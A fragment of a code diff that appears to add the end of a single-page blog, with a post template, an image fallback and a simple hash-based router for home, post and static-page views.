+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Simple router/navigator
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Listen for browser back/forward buttons
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                // Check if the hash matches a static page, otherwise assume it's a post
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initial Load
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+
+</html>
